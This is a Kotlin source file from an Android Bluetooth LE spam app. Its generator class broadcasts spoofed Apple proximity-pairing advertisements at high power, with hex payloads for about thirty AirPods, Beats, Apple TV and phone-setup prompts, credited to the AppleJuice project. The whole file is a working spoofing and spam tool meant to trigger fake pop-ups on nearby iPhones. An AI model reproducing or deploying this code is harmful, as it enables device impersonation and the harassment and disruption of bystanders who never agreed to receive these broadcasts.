package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSetParameters
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingCallback
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import de.simon.dankelmann.bluetoothlespam.Models.ManufacturerSpecificDataModel

class AppleDevicePopUpAdvertisementSetGenerator: IAdvertisementSetGenerator {

    private val _logTag = "AppleDevicePopUpAdvertisementSetGenerator"
    // Device Data taken from here:
    // https://github.com/ECTO-1A/AppleJuice/blob/main/ESP32-Arduino/applejuice/applejuice.ino

    var _deviceData = mapOf(
        "Airpods" to "022075aa3001000045121212000000000000000000000000",
        "Airpods Pro" to "0e2075aa3001000045121212000000000000000000000000",
        "Airpods Max" to "0a2075aa3001000045121212000000000000000000000000",
        "Airpods Gen 2" to "0f2075aa3001000045121212000000000000000000000000",
        "Airpods Gen 3" to "132075aa3001000045121212000000000000000000000000",
        "Airpods Pro Gen 2" to "142075aa3001000045121212000000000000000000000000",
        "Power Beats" to "032075aa3001000045121212000000000000000000000000",
        "Power Beats Pro" to "0b2075aa3001000045121212000000000000000000000000",
        "Beats Solo Pro" to "0c2075aa3001000045121212000000000000000000000000",
        "Beats Studio Buds" to "112075aa3001000045121212000000000000000000000000",
        "Beats Flex" to "102075aa3001000045121212000000000000000000000000",
        "Beats X" to "052075aa3001000045121212000000000000000000000000",
        "Beats Solo 3" to "062075aa3001000045121212000000000000000000000000",
        "Beats Studio 3" to "092075aa3001000045121212000000000000000000000000",
        "Beats Studio Pro" to "172075aa3001000045121212000000000000000000000000",
        "Beats Fit Pro" to "122075aa3001000045121212000000000000000000000000",
        "Beats Studio Buds Plus" to "162075aa3001000045121212000000000000000000000000",

        "Apple TV Setup" to "0004042a0000000f05c101604c95000010000000",
        "Apple TV Pair" to "0004042a0000000f05c106604c95000010000000",
        "Apple TV New User" to "0004042a0000000f05c120604c95000010000000",
        "Apple TV Apple ID Setup" to "0004042a0000000f05c12b604c95000010000000",
        "Apple TV Wireless Audio Sync" to "0004042a0000000f05c1c0604c95000010000000",
        "Apple TV Homekit Setup" to "0004042a0000000f05c10d604c95000010000000",
        "Apple TV Keyboard" to "0004042a0000000f05c113604c95000010000000",
        "Apple TV Connecting To Network" to "0004042a0000000f05c127604c95000010000000",
        "Homepod Setup" to "0004042a0000000f05c10b604c95000010000000",
        "Setup New Phone" to "0004042a0000000f05c109604c95000010000000",
        "Transfer Number" to "0004042a0000000f05c102604c95000010000000",
        "TV Color Balance" to "0004042a0000000f05c11e604c95000010000000",
    )

    private val _manufacturerId = 76 // 0x004C == 76 = Apple
    override fun getAdvertisementSets():List<AdvertisementSet> {
        var advertisementSets:MutableList<AdvertisementSet> = mutableListOf()

        _deviceData.map {

            var advertisementSet:AdvertisementSet = AdvertisementSet()

            // Advertise Settings
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = AdvertiseSettings.ADVERTISE_TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = true
            advertisementSet.advertiseSettings.timeout = 0

            // Advertising Parameters
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
            advertisementSet.advertisingSetParameters.txPowerLevel = AdvertisingSetParameters.TX_POWER_HIGH
            advertisementSet.advertisingSetParameters.primaryPhy = BluetoothDevice.PHY_LE_CODED
            advertisementSet.advertisingSetParameters.secondaryPhy = BluetoothDevice.PHY_LE_2M

            // AdvertiseData
            advertisementSet.advertiseData.includeDeviceName = false
            advertisementSet.advertiseData.includeTxPower = false

            val manufacturerSpecificData = ManufacturerSpecificDataModel()
            manufacturerSpecificData.manufacturerId = _manufacturerId

            manufacturerSpecificData.manufacturerSpecificData = StringHelpers.decodeHex(it.value)
            advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)

            // Scan Response
            advertisementSet.scanResponse.includeTxPower = false

            // General Data
            advertisementSet.deviceName = it.key

            // Callbacks
            advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GenericAdvertisingCallback()

            advertisementSets.add(advertisementSet)
        }

        return advertisementSets.toList()
    }
}